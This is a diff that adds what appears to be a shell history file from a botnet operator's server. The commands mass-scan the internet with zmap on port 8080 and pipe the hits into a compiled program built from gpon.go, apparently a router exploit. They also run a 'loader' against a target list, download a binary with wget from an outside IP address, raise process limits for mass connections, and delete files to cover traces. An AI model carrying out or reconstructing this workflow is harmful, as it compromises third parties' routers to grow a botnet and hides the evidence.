@@ -1,0 +1,103 @@
+sh Zmap_Install.sh 
+rm -rf Zmap_Install.sh v2.1.0.tar.gz 
+yum install golang
+go build -o gp gpon.go 
+zmap -p8080 -wmx.zone -B60M -o-|./gp
+zmap -p8080 -wmx.zone -B50M -o-|./gp
+ps
+ps -a
+zmap -p8080 -wmx.zone -B30M -o-|./gp
+zmap -p8080 -wmx.zone -B30M -T3 -o-|./gp
+rm -rf gpon.go 
+free
+free -g
+go build -o gp gpon.go 
+chmod 777 * -R
+zmap -p8080 -wmx.zone -B60M -o-|./gp
+zmap -p8080 -wmx.zone -B45M -o-|./gp
+zmap -p8080 -wmx.zone -B20M -o-|./gp
+zmap -p8080 -wmx.zone -B20M -o-|./gp
+zmap -p8080 -wmx.zone -B40M -o-|./gp
+zmap -p8080 -wmx.zone -B30M -o-|./gp
+zmap -p8080 -o load.txt -wmx.zone -B20M
+cat load.txt -o-|./gp
+cat load.txt |./gp
+cat load.txt | ./gp
+zmap -p8080 -o load.txt -wmx.zone -B20M
+zmap -p8080 -wmx.zone -B30M -o-|./gp
+zmap -p8080 -wmx.zone -B30M -o-|./gp
+go build -o joey gpon.go 
+ps
+ps -a
+zmap -p8080 -wmx.zone -B30M -o-|./joey 
+zmap -p8080 -wmx.zone -B30M -o-|./gp
+ifconfig#
+rm -rf g* load.txt mx.zone 
+rm joey 
+ifconfig
+exit
+cd loader/
+wc eee.txt -l
+cat loader 
+cd bins/
+mamp dlr.x86 
+nano dlr.x86 
+cd /lost+found/
+wget http://213.183.53.120/bins/cat.x86
+strings cat.x86 
+rm cat.x86 
+exit
+cd loader/
+chmod 0777 *
+ulimit -u999999; ulimit -n9999989
+ulimit -u999999; ulimit -n999999
+cat eee.txt | ./loader
+zmap
+zmap -p8080
+zmap -p8080 -omfu.txt
+nload
+yum install epel-release nload -y
+nload
+pkill screen
+lxof
+lsof
+yum install lsof
+lsof
+zmap -p8080 -wmx.zone -og.txt
+cd ..
+zmap -p8080 -wmx.zone -og.txt
+rm -rf g.txt 
+go
+go build -o /root/gpp /root/gpon.go 
+zmap -p8080 -wmx.zone | ./gpp
+zmap -p8080 -wmx.zone -omf.txt
+go build -o /root/gpp /root/gpon.go 
+zmap -p8080 -wmx.zone | ./gpp
+go build -o /root/gpp /root/gpon.go 
+zmap -p8080 -wmx.zone | ./gpp
+go build -o /root/gpp /root/gpon.go 
+zmap -p8080 -wmx.zone | ./gpp
+go build -o /root/gpp /root/gpon.go 
+zmap -p8080 -wmx.zone | ./gpp
+go build -o /root/gpp /root/gpon.go 
+zmap -p8080 -wmx.zone | ./gpp
+rm -rf gpp 
+rm -rf gpon.go 
+zmap -p8080 -wmx.zone -T4 -omm.txt
+pkill screen
+zmap -p8080 -wmx.zone -T4 -omm.txt
+zmap -p8080 -wmx.zone -omm.txt
+yum install python-requests -y
+python gpp.py 
+python gpp.py mf.txt
+cd loader/
+cat eee.txt | ./loader
+ulimit -u999999; ulimit -n999999
+cat eee.txt | ./loader
+cd ..
+go build -o /root/gpp /root/gpon.go 
+go build -o /root/gpp /root/gpon.go 
+pkill screen
+go build -o /root/gpp /root/gpon.go 
+zmap -p8080 -wmx.zone | ./gpp
+zmap -p8080 -wmx.zone | ./gpp
